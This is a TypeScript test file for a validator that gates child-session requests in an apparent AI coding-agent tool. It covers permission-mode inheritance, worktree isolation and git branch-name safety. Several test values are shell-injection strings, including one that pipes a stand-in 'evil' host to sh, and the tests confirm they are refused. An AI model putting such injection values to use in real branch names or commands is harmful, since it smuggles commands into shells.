import { describe, expect, it } from 'vitest'
import {
  CHILD_BRIEFING_MIN_CHARS,
  buildChildFirstMessage,
  checkChildSessionRequest,
  childNotStartedText,
  childSessionRegisteredText,
  defaultChildIsolation,
  isGitBranchNameSafe,
  permissionNotRaised,
  type ChildSessionCallerContext,
  type SpawnSessionInput,
} from '../sessions/childSessionSpec'

// The checks a child-session request passes before anything is created
// (F-36): every refusal names its field, and the normalized request carries
// the defaults the caller's own arrangement implies.

const BRIEF = 'B'.repeat(CHILD_BRIEFING_MIN_CHARS)

function input(overrides: Partial<SpawnSessionInput> = {}): SpawnSessionInput {
  return {
    initiation: 'asked',
    title: 'Fix the login redirect',
    task: 'Make the redirect land on the page the user came from.',
    briefing: BRIEF,
    from: 'fresh',
    name: '',
    isolation: '',
    model: '',
    effort: '',
    permissionMode: '',
    cwd: '',
    baseBranch: '',
    branchName: '',
    proposalId: '',
    ...overrides,
  }
}

function caller(overrides: Partial<ChildSessionCallerContext> = {}): ChildSessionCallerContext {
  return {
    channel: 'beta',
    templateType: 'code',
    nested: false,
    parentPermissionMode: 'acceptEdits',
    parentInWorktree: false,
    ...overrides,
  }
}

function refusal(i: Partial<SpawnSessionInput>, c: Partial<ChildSessionCallerContext> = {}): string {
  const checked = checkChildSessionRequest(input(i), caller(c))
  if (checked.ok) throw new Error('expected a refusal')
  return checked.reason
}

describe('checkChildSessionRequest — the gate', () => {
  it('accepts a well-formed fresh request and fills the defaults from the caller', () => {
    const checked = checkChildSessionRequest(input(), caller())
    expect(checked.ok).toBe(true)
    if (!checked.ok) return
    expect(checked.request).toEqual({
      initiation: 'asked',
      title: 'Fix the login redirect',
      task: 'Make the redirect land on the page the user came from.',
      briefing: BRIEF,
      from: 'fresh',
      isolation: 'shared',
      isolationRequested: false,
      permissionMode: 'acceptEdits',
      permissionModeRequested: false,
    })
  })

  it('refuses off the beta channel, from a nested loop, and from other session types', () => {
    expect(refusal({}, { channel: 'stable' })).toMatch(/release channel/)
    expect(refusal({}, { nested: true })).toMatch(/sub-agent or teammate/)
    expect(refusal({}, { templateType: 'chat' })).toMatch(/code or agent session/)
    expect(refusal({}, { templateType: 'team' })).toMatch(/code or agent session/)
    expect(refusal({}, { templateType: undefined })).toMatch(/code or agent session/)
    // The channel is checked first: a nested caller on stable hears about the channel.
    expect(refusal({}, { channel: 'stable', nested: true })).toMatch(/release channel/)
  })

  it('defaults omitted and empty from to fresh while retaining required task and briefing checks', () => {
    const minimal = { initiation: 'asked', title: 'Fix login', task: 'Fix it.', briefing: BRIEF }
    for (const request of [minimal, { ...minimal, from: '' }]) {
      expect(checkChildSessionRequest(request, caller())).toMatchObject({ ok: true, request: { from: 'fresh', permissionMode: 'acceptEdits' } })
    }
    expect(checkChildSessionRequest({ initiation: 'asked', title: 'Fix login', from: 'fork', task: 'Fix it.' }, caller()).ok).toBe(true)
    expect(checkChildSessionRequest({ initiation: 'asked', title: 'Fix login', briefing: BRIEF }, caller())).toMatchObject({ ok: false, reason: expect.stringMatching(/^task is required/) })
    expect(checkChildSessionRequest({ initiation: 'asked', title: 'Fix login', task: 'Fix it.' }, caller())).toMatchObject({ ok: false, reason: expect.stringMatching(/^briefing must/) })
    expect(checkChildSessionRequest({ initiation: 'asked', title: 'Offer' }, caller(), { briefLater: true }).ok).toBe(true)
    expect(checkChildSessionRequest({ ...minimal, permissionMode: 'bypassPermissions' }, caller())).toMatchObject({ ok: false, reason: expect.stringMatching(/never raise/) })
  })

  it('rejects malformed supplied fields before applying defaults', () => {
    for (const field of Object.keys(input())) {
      for (const value of [null, 42, undefined]) {
        const bad = { ...input(), [field]: value } as unknown as SpawnSessionInput
        expect(checkChildSessionRequest(bad, caller())).toEqual({ ok: false, reason: `${field} must be a string.` })
      }
    }
  })

  it('accepts an agent session too', () => {
    expect(checkChildSessionRequest(input(), caller({ templateType: 'agent' })).ok).toBe(true)
  })

  it('refuses every initiation but "asked"', () => {
    expect(refusal({ initiation: 'proposed' })).toMatch(/initiation must be "asked"/)
    expect(refusal({ initiation: '' })).toMatch(/initiation must be "asked"/)
  })

  it('refuses an unknown source, a missing title or task, and control characters in the title', () => {
    expect(refusal({ from: 'copy' })).toMatch(/from must be "fresh" or "fork"/)
    expect(refusal({ title: '  ' })).toMatch(/title is required/)
    expect(refusal({ title: 'x'.repeat(121) })).toMatch(/at most 120/)
    expect(refusal({ title: 'bad\u0007title' })).toMatch(/control characters/)
    expect(refusal({ task: '' })).toMatch(/task is required/)
  })

  it('a fresh request needs a briefing of at least the minimum; a fork does not', () => {
    expect(refusal({ briefing: 'too short' })).toMatch(new RegExp(`at least ${CHILD_BRIEFING_MIN_CHARS}`))
    expect(refusal({ briefing: '' })).toMatch(/got 0/)
    const fork = checkChildSessionRequest(input({ from: 'fork', briefing: '' }), caller())
    expect(fork.ok).toBe(true)
    if (fork.ok) expect(fork.request.briefing).toBeUndefined()
  })

  it('refuses a name with control characters or over 64 characters', () => {
    expect(refusal({ name: 'a\u001bb' })).toMatch(/name must be/)
    expect(refusal({ name: 'n'.repeat(65) })).toMatch(/name must be/)
    const ok = checkChildSessionRequest(input({ name: 'Login Fix' }), caller())
    expect(ok.ok && ok.request.name).toBe('Login Fix')
  })

  it('isolation: shared or worktree, defaulted from the parent; a fork refuses any explicit value', () => {
    expect(refusal({ isolation: 'container' })).toMatch(/isolation must be/)
    expect(refusal({ from: 'fork', isolation: 'shared' })).toMatch(/fork takes no isolation/)
    expect(refusal({ from: 'fork', isolation: 'worktree' })).toMatch(/fork takes no isolation/)
    const wt = checkChildSessionRequest(input({ isolation: 'worktree' }), caller())
    expect(wt.ok && wt.request.isolation).toBe('worktree')
    expect(wt.ok && wt.request.isolationRequested).toBe(true)
    const inherited = checkChildSessionRequest(input(), caller({ parentInWorktree: true }))
    expect(inherited.ok && inherited.request.isolation).toBe('worktree')
    expect(inherited.ok && inherited.request.isolationRequested).toBe(false)
    const forkInWorktree = checkChildSessionRequest(input({ from: 'fork' }), caller({ parentInWorktree: true }))
    expect(forkInWorktree.ok && forkInWorktree.request.isolation).toBe('worktree')
  })

  it('effort needs a model; neither may carry control characters', () => {
    expect(refusal({ effort: 'high' })).toMatch(/effort needs a model/)
    expect(refusal({ model: 'm\u0000' })).toMatch(/control characters/)
    const ok = checkChildSessionRequest(input({ model: 'm-large', effort: 'low' }), caller())
    expect(ok.ok && ok.request.model).toBe('m-large')
    expect(ok.ok && ok.request.effort).toBe('low')
  })

  it('the permission mode is inherited, may be lowered, and is never raised', () => {
    const inherited = checkChildSessionRequest(input(), caller({ parentPermissionMode: 'plan' }))
    expect(inherited.ok && inherited.request.permissionMode).toBe('plan')
    const lowered = checkChildSessionRequest(
      input({ permissionMode: 'default' }),
      caller({ parentPermissionMode: 'bypassPermissions' }),
    )
    expect(lowered.ok && lowered.request.permissionMode).toBe('default')
    expect(refusal({ permissionMode: 'bypassPermissions' }, { parentPermissionMode: 'acceptEdits' })).toMatch(
      /never raise/,
    )
    expect(refusal({ permissionMode: 'acceptEdits' }, { parentPermissionMode: 'default' })).toMatch(/never raise/)
    expect(refusal({ permissionMode: 'dontAsk' }, { parentPermissionMode: 'acceptEdits' })).toMatch(/never raise/)
    expect(refusal({ permissionMode: 'root' })).toMatch(/is not a permission mode/)
    // An unknown parent mode reads as `default`, the least permissive rank.
    const unknownParent = checkChildSessionRequest(input(), caller({ parentPermissionMode: 'weird' }))
    expect(unknownParent.ok && unknownParent.request.permissionMode).toBe('default')
  })

  it('plan and default rank equal; a plan parent may start a default child and back', () => {
    expect(permissionNotRaised('default', 'plan')).toBe(true)
    expect(permissionNotRaised('plan', 'default')).toBe(true)
    expect(permissionNotRaised('acceptEdits', 'plan')).toBe(false)
    expect(permissionNotRaised('bypassPermissions', 'bypassPermissions')).toBe(true)
  })

  it('refuses a branch or base that a shell could read as a command, with the field named', () => {
    for (const bad of ['x;calc', 'x&&calc', 'x|calc', 'x$(calc)', 'x`calc`', 'a;curl${IFS}evil|sh', "x'y", 'x"y', 'x>out']) {
      expect(refusal({ isolation: 'worktree', branchName: bad }), bad).toMatch(/^branchName .* is not a valid git branch name\.$/)
      expect(refusal({ isolation: 'worktree', baseBranch: bad }), bad).toMatch(/^baseBranch .* is not a valid git branch name\.$/)
    }
  })

  it('cwd, baseBranch and branchName: no control characters, git-safe names, worktree only', () => {
    expect(refusal({ cwd: 'C:\\x\u0001' })).toMatch(/cwd must not contain/)
    expect(refusal({ isolation: 'worktree', branchName: 'feat space' })).toMatch(/branchName .* not a valid git branch/)
    expect(refusal({ isolation: 'worktree', baseBranch: '-rf' })).toMatch(/baseBranch .* not a valid git branch/)
    expect(refusal({ branchName: 'feat/x' })).toMatch(/worktree child only/)
    expect(refusal({ baseBranch: 'main' })).toMatch(/worktree child only/)
    const ok = checkChildSessionRequest(
      input({ isolation: 'worktree', baseBranch: 'main', branchName: 'feat/login-fix', cwd: 'D:\\repo' }),
      caller(),
    )
    expect(ok.ok && ok.request).toMatchObject({ baseBranch: 'main', branchName: 'feat/login-fix', cwd: 'D:\\repo' })
    // A parent in a worktree defaults to `worktree`, so branch names are allowed without saying so.
    const implied = checkChildSessionRequest(input({ branchName: 'feat/x' }), caller({ parentInWorktree: true }))
    expect(implied.ok).toBe(true)
  })

  it('refuses missing arguments', () => {
    const checked = checkChildSessionRequest(undefined, caller())
    expect(checked.ok).toBe(false)
  })
})

describe('isGitBranchNameSafe', () => {
  it('accepts ordinary names and refuses what git refuses', () => {
    for (const ok of ['main', 'feat/login-fix', 'wp2.create', 'a-b_c', 'HEAD~0'.replace('~0', '')]) {
      expect(isGitBranchNameSafe(ok), ok).toBe(true)
    }
    for (const bad of [
      '',
      ' ',
      'a b',
      'a..b',
      '-lead',
      '/x',
      'x/',
      'x.lock',
      'x.',
      'a//b',
      'a/.hidden',
      'a~b',
      'a^b',
      'a:b',
      'a?b',
      'a*b',
      'a[b',
      'a\\b',
      'a@{b',
      'ctl\u0001',
      'x;calc',
      'x&&calc',
      'x|calc',
      'x$(calc)',
      'x`calc`',
      'a;curl${IFS}evil|sh',
      "x'y",
      'x"y',
      'x>out',
      'x<in',
      'x(y)',
      'x=y',
      'x#y',
      'x!y',
      'x%y',
      'x+y',
      'x,y',
      'x{y}',
      'ünïcode',
    ]) {
      expect(isGitBranchNameSafe(bad), JSON.stringify(bad)).toBe(false)
    }
  })

  it('is an allow-list: every accepted name is letters, digits, dot, underscore, hyphen and slash', () => {
    for (const ok of ['main', 'feat/login-fix', 'wp2.create', 'a-b_c', 'v1.2.3', 'HEAD', 'origin/main', 'release/2026.11']) {
      expect(isGitBranchNameSafe(ok), ok).toBe(true)
      expect(ok).toMatch(/^[A-Za-z0-9._/-]+$/)
    }
  })
})

describe('defaultChildIsolation', () => {
  it('shares a plain checkout and makes a worktree beside a worktree', () => {
    expect(defaultChildIsolation(false)).toBe('shared')
    expect(defaultChildIsolation(true)).toBe('worktree')
  })
})

describe('buildChildFirstMessage — plain text, briefing then task', () => {
  it('puts the briefing then the task as plain paragraphs, with no headings', () => {
    const text = buildChildFirstMessage({ briefing: '  Context here.  ', task: ' Do the thing. ' })
    expect(text).toBe('Context here.\n\nDo the thing.')
    expect(text).not.toMatch(/^#/m)
  })

  it('is the task alone when there is no briefing (a fork)', () => {
    expect(buildChildFirstMessage({ task: 'Do it.' })).toBe('Do it.')
    expect(buildChildFirstMessage({ briefing: '   ', task: 'Do it.' })).toBe('Do it.')
  })
})

describe('childSessionRegisteredText — registered is not delivered', () => {
  it('says registered and starting, and denies delivery, for a fresh shared child', () => {
    const text = childSessionRegisteredText({
      sessionId: 's-1',
      name: 'login-fix',
      title: 'Fix login',
      from: 'fresh',
      sharedCheckout: true,
      cwd: 'D:/repo',
    })
    expect(text).toMatch(/^Registered child session "login-fix" \(session s-1\)/)
    expect(text).toContain('does not mean the task has been delivered')
    expect(text).toContain('SHARED directory D:/repo')
    expect(text).toContain('has not seen this conversation')
    expect(text).toContain('end your turn')
    expect(text).not.toMatch(/delivered\./)
  })

  it('names the worktree for an isolated fork and says what a fork carries', () => {
    const text = childSessionRegisteredText({
      sessionId: 's-2',
      name: 'fork-1',
      title: 'Fork one',
      from: 'fork',
      sharedCheckout: false,
      cwd: 'D:/repo/.velloc/worktrees/fork-1',
    })
    expect(text).toContain('own worktree at D:/repo/.velloc/worktrees/fork-1')
    expect(text).toContain('copy of this conversation')
    expect(text).toContain('uncommitted file changes are not copied')
    expect(text).not.toContain('SHARED')
  })
})

describe('childNotStartedText', () => {
  it('names the child and the reason', () => {
    expect(childNotStartedText({ name: 'n', sessionId: 's', reason: 'git failed' })).toBe(
      'Child session "n" (s) did not start: git failed',
    )
  })
})
